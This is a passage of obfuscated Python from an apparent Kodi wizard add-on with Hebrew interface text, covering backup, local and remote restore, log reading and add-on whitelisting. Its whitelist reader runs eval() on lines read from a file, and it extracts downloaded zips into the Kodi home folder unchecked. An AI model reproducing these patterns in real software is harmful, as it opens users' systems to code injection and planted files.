            if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include the [COLOR %s]guisettings.xml[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:2757
                O0O00OO0O0000O0O0 .write (GUISETTINGS ,'/userdata/guisettings.xml',zipfile .ZIP_DEFLATED )#line:2758
        except Exception as OOOO0O0O0O00OOO0O :#line:2759
            O0O00OO0O0000O0O0 .close ()#line:2760
            log ("[Back Up] Type = '%s': %s"%(O000O000OOO0O000O ,str (OOOO0O0O0O00OOO0O )),5 )#line:2761
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] theme zip failed:[/COLOR]"%(COLOR1 ,O0OOO0O000O00O000 ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,str (OOOO0O0O0O00OOO0O )))#line:2762
            if not O00OOOOO0OOO0O0OO =='':#line:2763
                try :os .remove (translatepath (O00OOOOO0OOO0O0OO ))#line:2764
                except Exception as OOOO0O0O0O00OOO0O :log (str (OOOO0O0O0O00OOO0O ))#line:2765
            else :#line:2766
                try :os .remove (translatepath (OO0O0OO0OOOO0OOO0 ))#line:2767
                except Exception as OOOO0O0O0O00OOO0O :log (str (OOOO0O0O0O00OOO0O ))#line:2768
            return #line:2769
        O0O00OO0O0000O0O0 .close ()#line:2770
        if not O00OOOOO0OOO0O0OO =='':#line:2771
            OOOO0000OO00OO0O0 =xbmcvfs .rename (O00OOOOO0OOO0O0OO ,OO0O0OO0OOOO0OOO0 )#line:2772
            if OOOO0000OO00OO0O0 ==0 :#line:2773
                xbmcvfs .copy (O00OOOOO0OOO0O0OO ,OO0O0OO0OOOO0OOO0 )#line:2774
                xbmcvfs .delete (O00OOOOO0OOO0O0OO )#line:2775
        DIALOG .ok (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] theme zip successful:[/COLOR]"%(COLOR1 ,O0OOO0O000O00O000 ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OO0OOOO0OOO0 ))#line:2776
    elif O000O000OOO0O000O =="addondata":#line:2777
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]לבצע גיבוי הגדרות?[/COLOR]"%COLOR2 ,nolabel ="[B][COLOR white]ביטול [/COLOR][/B]",yeslabel ="[B][COLOR green]אישור[/COLOR][/B]"):#line:2778
            if name =="":#line:2779
                name =getKeyboard ("","הכנס שם באנגלית לקובץ הגיבוי")#line:2780
                if not name :return False #line:2781
                name =urllib .quote_plus (name )#line:2782
            name ='%s_addondata.zip'%name ;O00OOOOO0OOO0O0OO =''#line:2783
            OO0O0OO0OOOO0OOO0 =os .path .join (OO0O00OO00000OOO0 ,name )#line:2784
            try :#line:2785
                O0O00OO0O0000O0O0 =zipfile .ZipFile (translatepath (OO0O0OO0OOOO0OOO0 ),mode ='w')#line:2786
            except :#line:2787
                try :#line:2788
                    O00OOOOO0OOO0O0OO =os .path .join (PACKAGES ,'%s.zip'%name )#line:2789
                    O0O00OO0O0000O0O0 =zipfile .ZipFile (O00OOOOO0OOO0O0OO ,mode ='w')#line:2790
                except :#line:2791
                    log ("Unable to create %s_addondata.zip"%name ,5 )#line:2792
                    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]אין באפשרותנו לכתוב לספריית הגיבוי הנוכחית, האם ברצונך לשנות את המיקום?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]אישור[/COLOR][/B]",nolabel ="[B][COLOR white]ביטול[/COLOR][/B]"):#line:2793
                        openS ()#line:2794
                        return #line:2795
                    else :#line:2796
                        return #line:2797
            O0OO000O000000OO0 =0 #line:2798
            O00OO0OOO00O00000 =[]#line:2799
            convertSpecial (ADDOND ,True )#line:2800
            asciiCheck (ADDOND ,True )#line:2801
            DP .create ("[COLOR %s]%s[/COLOR][COLOR %s]: Creating Zip[/COLOR]"%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Creating back up zip"%COLOR2 ,"","Please Wait...[/COLOR]")#line:2802
            for O0000OOO0O0OOOO0O ,OOO0O0O0OO0O0O0O0 ,O00OO0OO00OOOO0O0 in os .walk (ADDOND ):#line:2803
                OOO0O0O0OO0O0O0O0 [:]=[OO00OOO0OOO0O00OO for OO00OOO0OOO0O00OO in OOO0O0O0OO0O0O0O0 if OO00OOO0OOO0O00OO not in OOO000O0O00O00OO0 ]#line:2804
                O00OO0OO00OOOO0O0 [:]=[O0O0OO0OOO0000OOO for O0O0OO0OOO0000OOO in O00OO0OO00OOOO0O0 if O0O0OO0OOO0000OOO not in OOO00O0O0O0O00OO0 ]#line:2805
                for OOOO0O0OO0OO000OO in O00OO0OO00OOOO0O0 :#line:2806
                    O00OO0OOO00O00000 .append (OOOO0O0OO0OO000OO )#line:2807
            O000O0OOOO0O00OO0 =len (O00OO0OOO00O00000 )#line:2808
            for O0000OOO0O0OOOO0O ,OOO0O0O0OO0O0O0O0 ,O00OO0OO00OOOO0O0 in os .walk (ADDOND ):#line:2809
                OOO0O0O0OO0O0O0O0 [:]=[OOO00O00OOOOOO0OO for OOO00O00OOOOOO0OO in OOO0O0O0OO0O0O0O0 if OOO00O00OOOOOO0OO not in OOO000O0O00O00OO0 ]#line:2810
                O00OO0OO00OOOO0O0 [:]=[O0O000OO00OO0OOOO for O0O000OO00OO0OOOO in O00OO0OO00OOOO0O0 if O0O000OO00OO0OOOO not in OOO00O0O0O0O00OO0 ]#line:2811
                for OOOO0O0OO0OO000OO in O00OO0OO00OOOO0O0 :#line:2812
                    try :#line:2813
                        O0OO000O000000OO0 +=1 #line:2814
                        OOO0O0000000O00OO =percentage (O0OO000O000000OO0 ,O000O0OOOO0O00OO0 )#line:2815
                        DP .update (int (OOO0O0000000O00OO ),'[COLOR %s]Creating back up zip: [COLOR%s]%s[/COLOR] / [COLOR%s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO000O000000OO0 ,COLOR1 ,O000O0OOOO0O00OO0 ),'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO0O0OO0OO000OO ),'')#line:2816
                        O00O00O000000O000 =os .path .join (O0000OOO0O0OOOO0O ,OOOO0O0OO0OO000OO )#line:2817
                        if OOOO0O0OO0OO000OO in LOGFILES :log ("[Back Up] Type = '%s': Ignore %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 );continue #line:2818
                        elif os .path .join (O0000OOO0O0OOOO0O ,OOOO0O0OO0OO000OO )in O0OO0O0OO0OOO0O0O :log ("[Back Up] Type = '%s': Ignore %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 );continue #line:2819
                        elif os .path .join ('addons','packages')in O00O00O000000O000 :log ("[Back Up] Type = '%s': Ignore %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 );continue #line:2820
                        elif OOOO0O0OO0OO000OO .endswith ('.csv'):log ("[Back Up] Type = '%s': Ignore %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 );continue #line:2821
                        elif OOOO0O0OO0OO000OO .endswith ('.db')and 'Database'in O0000OOO0O0OOOO0O :#line:2822
                            O0OOO00OOOO0000O0 =OOOO0O0OO0OO000OO .replace ('.db','')#line:2823
                            O0OOO00OOOO0000O0 =''.join ([O0O00OOO000O000O0 for O0O00OOO000O000O0 in O0OOO00OOOO0000O0 if not O0O00OOO000O000O0 .isdigit ()])#line:2824
                            if O0OOO00OOOO0000O0 in ['Addons','ADSP','Epg','MyMusic','MyVideos','Textures','TV','ViewModes']:#line:2825
                                if not OOOO0O0OO0OO000OO ==latestDB (O0OOO00OOOO0000O0 ):log ("[Back Up] Type = '%s': Ignore %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 );continue #line:2826
                        try :#line:2827
                            O0O00OO0O0000O0O0 .write (O00O00O000000O000 ,O00O00O000000O000 [len (ADDOND ):],zipfile .ZIP_DEFLATED )#line:2828
                        except Exception as OOOO0O0O0O00OOO0O :#line:2829
                            log ("[Back Up] Type = '%s': Unable to backup %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 )#line:2830
                            log ("Backup Error: %s"%str (OOOO0O0O0O00OOO0O ),5 )#line:2831
                    except Exception as OOOO0O0O0O00OOO0O :#line:2832
                        log ("[Back Up] Type = '%s': Unable to backup %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 )#line:2833
                        log ("Backup Error: %s"%str (OOOO0O0O0O00OOO0O ),5 )#line:2834
            O0O00OO0O0000O0O0 .close ()#line:2835
            if not O00OOOOO0OOO0O0OO =='':#line:2836
                OOOO0000OO00OO0O0 =xbmcvfs .rename (O00OOOOO0OOO0O0OO ,OO0O0OO0OOOO0OOO0 )#line:2837
                if OOOO0000OO00OO0O0 ==0 :#line:2838
                    xbmcvfs .copy (O00OOOOO0OOO0O0OO ,OO0O0OO0OOOO0OOO0 )#line:2839
                    xbmcvfs .delete (O00OOOOO0OOO0O0OO )#line:2840
            DP .close ()#line:2841
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]הגיבוי בוצע בהצלחה![/COLOR]"%(COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OO0OOOO0OOO0 ))#line:2842
def restoreLocal (O00O000OO00OOO0OO ):#line:2844
    O0OO0OO0OOOOOO00O =translatepath (BACKUPLOCATION )#line:2845
    O0OO0O0OOOOOOOOOO =translatepath (MYBUILDS )#line:2846
    try :#line:2847
        if not os .path .exists (O0OO0OO0OOOOOO00O ):xbmcvfs .mkdirs (O0OO0OO0OOOOOO00O )#line:2848
        if not os .path .exists (O0OO0O0OOOOOOOOOO ):xbmcvfs .mkdirs (O0OO0O0OOOOOOOOOO )#line:2849
    except Exception as OO00O00O00O000OO0 :#line:2850
        DIALOG .ok (ADDONTITLE ,"[COLOR %s]Error making Back Up directories:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,str (OO00O00O00O000OO0 )))#line:2851
        return #line:2852
    OOOOO0O0OOOO00OOO =DIALOG .browse (1 ,'[COLOR %s]בחר את הקובץ שתרצה לשחזר[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:2853
    log ("[RESTORE BACKUP %s] File: %s "%(O00O000OO00OOO0OO .upper (),OOOOO0O0OOOO00OOO ),5 )#line:2854
    if OOOOO0O0OOOO00OOO ==""or not OOOOO0O0OOOO00OOO .endswith ('.zip'):#line:2855
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore: Cancelled[/COLOR]"%COLOR2 )#line:2856
        return #line:2857
    DP .create (ADDONTITLE ,'[COLOR %s]Installing Local Backup'%COLOR2 ,'','Please Wait[/COLOR]')#line:2858
    if not os .path .exists (USERDATA ):os .makedirs (USERDATA )#line:2859
    if not os .path .exists (ADDOND ):os .makedirs (ADDOND )#line:2860
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2861
    if O00O000OO00OOO0OO =="gui":O00OOOOO0O0O00O0O =USERDATA #line:2862
    elif O00O000OO00OOO0OO =="addondata":#line:2863
        O00OOOOO0O0O00O0O =ADDOND #line:2864
    else :O00OOOOO0O0O00O0O =HOME #line:2865
    log ("Restoring to %s"%O00OOOOO0O0O00O0O ,5 )#line:2866
    O0O000000OOO0O0O0 =os .path .split (OOOOO0O0OOOO00OOO )#line:2867
    O00O00000OOO00O00 =O0O000000OOO0O0O0 [1 ]#line:2868
    try :#line:2869
        zipfile .ZipFile (OOOOO0O0OOOO00OOO ,'r')#line:2870
    except :#line:2871
        DP .update (0 ,'[COLOR %s]Unable to read zipfile from current location.'%COLOR2 ,'Copying file to packages')#line:2872
        OO0OO00000O00O0O0 =os .path .join ('special://home','addons','packages',O00O00000OOO00O00 )#line:2873
        xbmcvfs .copy (OOOOO0O0OOOO00OOO ,OO0OO00000O00O0O0 )#line:2874
        OOOOO0O0OOOO00OOO =translatepath (OO0OO00000O00O0O0 )#line:2875
        DP .update (0 ,'','Copying file to packages: Complete')#line:2876
        zipfile .ZipFile (OOOOO0O0OOOO00OOO ,'r')#line:2877
    OOOO00O00OOO00OO0 ,O00O000OO0O00O0O0 ,OO00OO0O0O00O00OO =extract .all (OOOOO0O0OOOO00OOO ,O00OOOOO0O0O00O0O ,DP )#line:2878
    clearS ('build')#line:2879
    DP .close ()#line:2880
    defaultSkin ()#line:2881
    lookandFeelData ('save')#line:2882
    if not OOOOO0O0OOOO00OOO .find ('packages')==-1 :#line:2883
        try :os .remove (OOOOO0O0OOOO00OOO )#line:2884
        except :pass #line:2885
    if int (O00O000OO0O00O0O0 )>=1 :#line:2886
        OOOO00O0O00OO000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00000OOO00O00 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOO00O00OOO00OO0 ,'%',COLOR1 ,O00O000OO0O00O0O0 ),'Would you like to view the errors?[/COLOR]',nolabel ='[B][COLOR red]No Thanks[/COLOR][/B]',yeslabel ='[B][COLOR green]View Errors[/COLOR][/B]')#line:2887
        if OOOO00O0O00OO000O :#line:2888
            if isinstance (O00O000OO0O00O0O0 ,unicode ):#line:2889
                OO00OO0O0O00O00OO =OO00OO0O0O00O00OO .encode ('utf-8')#line:2890
            TextBox (ADDONTITLE ,OO00OO0O0O00O00OO .replace ('\t',''))#line:2891
    setS ('installed','true')#line:2892
    setS ('extract',str (OOOO00O00OOO00OO0 ))#line:2893
    setS ('errors',str (O00O000OO0O00O0O0 ))#line:2894
    if INSTALLMETHOD ==1 :O00O0OO00O0OO0000 =1 #line:2895
    elif INSTALLMETHOD ==2 :O00O0OO00O0OO0000 =0 #line:2896
    else :DIALOG .ok (ADDONTITLE ,"[COLOR %s]השחזור בוצע בהצלחה![/COLOR]"%COLOR2 );killxbmc ('true')#line:2897
    if O00O0OO00O0OO0000 ==1 :reloadFix ()#line:2898
    else :killxbmc (True )#line:2899
def restoreExternal (OOO000O00OOO000O0 ):#line:2901
    OOOO00O00000OO0O0 =DIALOG .browse (1 ,'[COLOR %s]Select the backup file you want to restore[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:2902
    if OOOO00O00000OO0O0 ==""or not OOOO00O00000OO0O0 .endswith ('.zip'):#line:2903
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore: Cancelled[/COLOR]"%COLOR2 )#line:2904
        return #line:2905
    if not OOOO00O00000OO0O0 .startswith ('http'):#line:2906
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore: Invalid URL[/COLOR]"%COLOR2 )#line:2907
        return #line:2908
    try :#line:2909
        O0O0O0000OOO0OO0O =workingURL (OOOO00O00000OO0O0 )#line:2910
    except :#line:2911
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore: Error Valid URL[/COLOR]"%COLOR2 )#line:2912
        log ("Not a working url, if source was local then use local restore option",5 )#line:2913
        log ("External Source: %s"%OOOO00O00000OO0O0 ,5 )#line:2914
        return #line:2915
    log ("[RESTORE EXT BACKUP %s] File: %s "%(OOO000O00OOO000O0 .upper (),OOOO00O00000OO0O0 ),5 )#line:2916
    O0O0O000O000OO0O0 =os .path .split (OOOO00O00000OO0O0 );O0OO000O0O00O0OO0 =O0O0O000O000OO0O0 [1 ]#line:2917
    DP .create (ADDONTITLE ,'[COLOR %s]Downloading Zip file'%COLOR2 ,'','Please Wait[/COLOR]')#line:2918
    if OOO000O00OOO000O0 =="gui":OO0O0OO000O0OO0OO =USERDATA #line:2919
    elif OOO000O00OOO000O0 =="addondata":OO0O0OO000O0OO0OO =ADDOND #line:2920
    else :OO0O0OO000O0OO0OO =HOME #line:2921
    if not os .path .exists (USERDATA ):os .makedirs (USERDATA )#line:2922
    if not os .path .exists (ADDOND ):os .makedirs (ADDOND )#line:2923
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2924
    O00O00000O00O00OO =os .path .join (PACKAGES ,O0OO000O0O00O0OO0 )#line:2925
    downloader .download (OOOO00O00000OO0O0 ,O00O00000O00O00OO ,DP )#line:2926
    DP .update (0 ,'Installing External Backup','','Please Wait')#line:2927
    OO00O0O0O0O000O00 ,OOOOOO0OO000O0O0O ,O0OO0O00000O0000O =extract .all (O00O00000O00O00OO ,OO0O0OO000O0OO0OO ,DP )#line:2928
    clearS ('build')#line:2929
    DP .close ()#line:2930
    defaultSkin ()#line:2931
    lookandFeelData ('save')#line:2932
    if int (OOOOOO0OO000O0O0O )>=1 :#line:2933
        O0OO0000O00OOOOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO000O0O00O0OO0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO00O0O0O0O000O00 ,'%',COLOR1 ,OOOOOO0OO000O0O0O ),'Would you like to view the errors?[/COLOR]',nolabel ='[B][COLOR red]No Thanks[/COLOR][/B]',yeslabel ='[B][COLOR green]View Errors[/COLOR][/B]')#line:2934
        if O0OO0000O00OOOOOO :#line:2935
            TextBox (ADDONTITLE ,O0OO0O00000O0000O .replace ('\t',''))#line:2936
    setS ('installed','true')#line:2937
    setS ('extract',str (OO00O0O0O0O000O00 ))#line:2938
    setS ('errors',str (OOOOOO0OO000O0O0O ))#line:2939
    try :os .remove (O00O00000O00O00OO )#line:2940
    except :pass #line:2941
    if INSTALLMETHOD ==1 :OO0000OOOO0O0O000 =1 #line:2942
    elif INSTALLMETHOD ==2 :OO0000OOOO0O0O000 =0 #line:2943
    else :OO0000OOOO0O0O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR green]Force Close[/COLOR][/B]")#line:2944
    if OO0000OOOO0O0O000 ==1 :reloadFix ()#line:2945
    else :killxbmc (True )#line:2946
def Grab_Log (file =False ,old =False ,wizard =False ):#line:2962
    if wizard ==True :#line:2963
        if not os .path .exists (WIZLOG ):return False #line:2964
        else :#line:2965
            if file ==True :#line:2966
                return WIZLOG #line:2967
            else :#line:2968
                OOOOOO0O0O0O0O000 =open (WIZLOG ,'r')#line:2969
                OO0OOOO0OOO0000O0 =OOOOOO0O0O0O0O000 .read ()#line:2970
                OOOOOO0O0O0O0O000 .close ()#line:2971
                return OO0OOOO0OOO0000O0 #line:2972
    OO0O00OO00O00000O =0 #line:2973
    O000O0OOOO0OO0000 =os .listdir (LOG )#line:2974
    O00OO000OO000OOOO =[]#line:2975
    for OOO00O0OO000OO000 in O000O0OOOO0OO0000 :#line:2977
        if old ==True and OOO00O0OO000OO000 .endswith ('.old.log'):O00OO000OO000OOOO .append (os .path .join (LOG ,OOO00O0OO000OO000 ))#line:2978
        elif old ==False and OOO00O0OO000OO000 .endswith ('.log')and not OOO00O0OO000OO000 .endswith ('.old.log'):O00OO000OO000OOOO .append (os .path .join (LOG ,OOO00O0OO000OO000 ))#line:2979
    if len (O00OO000OO000OOOO )>0 :#line:2981
        O00OO000OO000OOOO .sort (key =lambda OOO000000O0OO0OOO :os .path .getmtime (OOO000000O0OO0OOO ))#line:2982
        if file ==True :return O00OO000OO000OOOO [-1 ]#line:2983
        else :#line:2984
            OOOOOO0O0O0O0O000 =open (O00OO000OO000OOOO [-1 ],'r')#line:2985
            OO0OOOO0OOO0000O0 =OOOOOO0O0O0O0O000 .read ()#line:2986
            OOOOOO0O0O0O0O000 .close ()#line:2987
            return OO0OOOO0OOO0000O0 #line:2988
    else :#line:2989
        return False #line:2990
def whiteList (O0O0O000O0O000OO0 ):#line:2992
    O0O0000OOOO0O00OO =translatepath (BACKUPLOCATION )#line:2993
    O0OOOOOOO0OOO00O0 =translatepath (MYBUILDS )#line:2994
    if O0O0O000O0O000OO0 =='edit':#line:2995
        O000OO0O0O0O0OO00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2996
        O0OOO00O0000O000O =[];OO0O0OOOOO0O00O0O =[];OO00OO00OO0O0OO00 =[]#line:2997
        for O0000O0OO000O0OOO in sorted (O000OO0O0O0O0OO00 ,key =lambda O0OO0OOOO000O00O0 :O0OO0OOOO000O00O0 ):#line:2998
            O00OO0O000OO00000 =os .path .split (O0000O0OO000O0OOO [:-1 ])[1 ]#line:2999
            if O00OO0O000OO00000 in EXCLUDES :continue #line:3000
            elif O00OO0O000OO00000 in DEFAULTPLUGINS :continue #line:3001
            elif O00OO0O000OO00000 =='packages':continue #line:3002
            OO0OOOOO000OO0OO0 =os .path .join (O0000O0OO000O0OOO ,'addon.xml')#line:3003
            if os .path .exists (OO0OOOOO000OO0OO0 ):#line:3004
                OO0O0OO0OO00O0000 =open (OO0OOOOO000OO0OO0 )#line:3005
                O00O0OOO0OOO000O0 =OO0O0OO0OO00O0000 .read ()#line:3006
                OO0O0OO0OO00O0000 .close ()#line:3007
                OOOO0OO00O00OOOOO =parseDOM (O00O0OOO0OOO000O0 ,'addon',ret ='id')#line:3008
                OO0OOOOOO0OOO00OO =parseDOM (O00O0OOO0OOO000O0 ,'addon',ret ='name')#line:3009
                O0OO0OO0OO0O000OO =O00OO0O000OO00000 if len (OOOO0OO00O00OOOOO )==0 else OOOO0OO00O00OOOOO [0 ]#line:3010
                OO000O0O0O00O00OO =O00OO0O000OO00000 if len (OO0OOOOOO0OOO00OO )==0 else OO0OOOOOO0OOO00OO [0 ]#line:3011
                O0O0O0O0O00OO00O0 =OO000O0O0O00O00OO .replace ('[','<').replace (']','>')#line:3012
                O0O0O0O0O00OO00O0 =re .sub ('<[^<]+?>','',O0O0O0O0O00OO00O0 )#line:3013
                O0OOO00O0000O000O .append (O0O0O0O0O00OO00O0 )#line:3014
                OO0O0OOOOO0O00O0O .append (O0OO0OO0OO0O000OO )#line:3015
                OO00OO00OO0O0OO00 .append (O00OO0O000OO00000 )#line:3016
        OOOO0O000O0OOOO00 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3017
        for O0000O0OO000O0OOO in sorted (OOOO0O000O0OOOO00 ,key =lambda O00000OOO0O00O000 :O00000OOO0O00O000 ):#line:3018
            O00OO0O000OO00000 =os .path .split (O0000O0OO000O0OOO [:-1 ])[1 ]#line:3019
            if O00OO0O000OO00000 in OO00OO00OO0O0OO00 :continue #line:3020
            if O00OO0O000OO00000 in EXCLUDES :continue #line:3021
            OO0OOOOO000OO0OO0 =os .path .join (ADDONS ,O00OO0O000OO00000 ,'addon.xml')#line:3022
            O00000OOOOO0OO00O =os .path .join (XBMC ,'addons',O00OO0O000OO00000 ,'addon.xml')#line:3023
            if os .path .exists (OO0OOOOO000OO0OO0 ):#line:3024
                OO0O0OO0OO00O0000 =open (OO0OOOOO000OO0OO0 )#line:3025
            elif os .path .exists (O00000OOOOO0OO00O ):#line:3026
                OO0O0OO0OO00O0000 =open (O00000OOOOO0OO00O )#line:3027
            else :continue #line:3028
            O00O0OOO0OOO000O0 =OO0O0OO0OO00O0000 .read ()#line:3029
            OO0O0OO0OO00O0000 .close ()#line:3030
            OOOO0OO00O00OOOOO =parseDOM (O00O0OOO0OOO000O0 ,'addon',ret ='id')#line:3031
            OO0OOOOOO0OOO00OO =parseDOM (O00O0OOO0OOO000O0 ,'addon',ret ='name')#line:3032
            O0OO0OO0OO0O000OO =O00OO0O000OO00000 if len (OOOO0OO00O00OOOOO )==0 else OOOO0OO00O00OOOOO [0 ]#line:3033
            OO000O0O0O00O00OO =O00OO0O000OO00000 if len (OO0OOOOOO0OOO00OO )==0 else OO0OOOOOO0OOO00OO [0 ]#line:3034
            O0O0O0O0O00OO00O0 =OO000O0O0O00O00OO .replace ('[','<').replace (']','>')#line:3035
            O0O0O0O0O00OO00O0 =re .sub ('<[^<]+?>','',O0O0O0O0O00OO00O0 )#line:3036
            O0OOO00O0000O000O .append (O0O0O0O0O00OO00O0 )#line:3037
            OO0O0OOOOO0O00O0O .append (O0OO0OO0OO0O000OO )#line:3038
            OO00OO00OO0O0OO00 .append (O00OO0O000OO00000 )#line:3039
        OO00OO0000OOO0OO0 =[];OO0OO00O000OOO00O =0 #line:3040
        OOO00OOOOO00O0O00 =["-- לחץ כאן להמשך --"]+O0OOO00O0000O000O #line:3041
        OOO00000OOO00OO0O =whiteList ('read')#line:3042
        for O0O00O0OO000OOOOO in OOO00000OOO00OO0O :#line:3043
            log (str (O0O00O0OO000OOOOO ),5 )#line:3044
            try :O0OO0OOO0OOO0O00O ,OOOO000O0O00OOO0O ,O000OO0O0O0O0OO00 =O0O00O0OO000OOOOO #line:3045
            except Exception as OOOO000OO0OO00000 :log (str (OOOO000OO0OO00000 ))#line:3046
            if OOOO000O0O00OOO0O in OO0O0OOOOO0O00O0O :#line:3047
                OOOO0OO00OO0OOOO0 =OO0O0OOOOO0O00O0O .index (OOOO000O0O00OOO0O )+1 #line:3048
                OO00OO0000OOO0OO0 .append (OOOO0OO00OO0OOOO0 -1 )#line:3049
                OOO00OOOOO00O0O00 [OOOO0OO00OO0OOOO0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0OO0OOO0OOO0O00O )#line:3050
            else :#line:3051
                OO0O0OOOOO0O00O0O .append (OOOO000O0O00OOO0O )#line:3052
                O0OOO00O0000O000O .append (O0OO0OOO0OOO0O00O )#line:3053
                OOO00OOOOO00O0O00 .append ("[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0OO0OOO0OOO0O00O ))#line:3054
        OO0OO00O000OOO00O =1 #line:3055
        while not OO0OO00O000OOO00O in [-1 ,0 ]:#line:3056
            OO0OO00O000OOO00O =DIALOG .select ("%s: בחר הרחבות לשמירה ."%ADDONTITLE ,OOO00OOOOO00O0O00 )#line:3057
            if OO0OO00O000OOO00O ==-1 :break #line:3058
            elif OO0OO00O000OOO00O ==0 :break #line:3059
            else :#line:3060
                O0000O0OOOO0O0O00 =(OO0OO00O000OOO00O -1 )#line:3061
                if O0000O0OOOO0O0O00 in OO00OO0000OOO0OO0 :#line:3062
                    OO00OO0000OOO0OO0 .remove (O0000O0OOOO0O0O00 )#line:3063
                    OOO00OOOOO00O0O00 [OO0OO00O000OOO00O ]=O0OOO00O0000O000O [O0000O0OOOO0O0O00 ]#line:3064
                else :#line:3065
                    OO00OO0000OOO0OO0 .append (O0000O0OOOO0O0O00 )#line:3066
                    OOO00OOOOO00O0O00 [OO0OO00O000OOO00O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0OOO00O0000O000O [O0000O0OOOO0O0O00 ])#line:3067
        O0000000OOO00OOO0 =[]#line:3068
        if len (OO00OO0000OOO0OO0 )>0 :#line:3069
            for O0O000000OOO0O0OO in OO00OO0000OOO0OO0 :#line:3070
                O0000000OOO00OOO0 .append ("['%s', '%s', '%s']"%(O0OOO00O0000O000O [O0O000000OOO0O0OO ],OO0O0OOOOO0O00O0O [O0O000000OOO0O0OO ],OO00OO00OO0O0OO00 [O0O000000OOO0O0OO ]))#line:3071
            OOO00OO0O0000000O ='\n'.join (O0000000OOO00OOO0 )#line:3072
            OO0O0OO0OO00O0000 =open (WHITELIST ,'w');OO0O0OO0OO00O0000 .write (OOO00OO0O0000000O );OO0O0OO0OO00O0000 .close ()#line:3073
        else :#line:3074
            try :os .remove (WHITELIST )#line:3075
            except :pass #line:3076
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Addons in White List[/COLOR]"%(COLOR2 ,len (OO00OO0000OOO0OO0 )))#line:3077
    elif O0O0O000O0O000OO0 =='read':#line:3078
        O0OOOO0OO0OOOOO0O =[]#line:3079
        if os .path .exists (WHITELIST ):#line:3080
            OO0O0OO0OO00O0000 =open (WHITELIST )#line:3081
            O00O0OOO0OOO000O0 =OO0O0OO0OO00O0000 .read ()#line:3082
            OO0O0OO0OO00O0000 .close ()#line:3083
            OO000000OOOOOOOOO =O00O0OOO0OOO000O0 .split ('\n')#line:3084
            for O0O00O0OO000OOOOO in OO000000OOOOOOOOO :#line:3085
                try :#line:3086
                    O0OO0OOO0OOO0O00O ,OOOO000O0O00OOO0O ,O000OO0O0O0O0OO00 =eval (O0O00O0OO000OOOOO )#line:3087
                    O0OOOO0OO0OOOOO0O .append (eval (O0O00O0OO000OOOOO ))#line:3088
                except :#line:3089
                    pass #line:3090
        return O0OOOO0OO0OOOOO0O #line:3091
    elif O0O0O000O0O000OO0 =='view':#line:3092
        O0OOOOO0OO0O0O0O0 =whiteList ('read')#line:3093
        if len (O0OOOOO0OO0O0O0O0 )>0 :#line:3094
            O00O0O000O0O00O0O ="רשימת הרחבות שסימנתם שלא ימחקו בהתקנה נקיה או רגילה.[CR][CR]"#line:3095
            for O0O00O0OO000OOOOO in O0OOOOO0OO0O0O0O0 :#line:3096
                try :O0OO0OOO0OOO0O00O ,OOOO000O0O00OOO0O ,O000OO0O0O0O0OO00 =O0O00O0OO000OOOOO #line:3097
                except Exception as OOOO000OO0OO00000 :log (str (OOOO000OO0OO00000 ))#line:3098
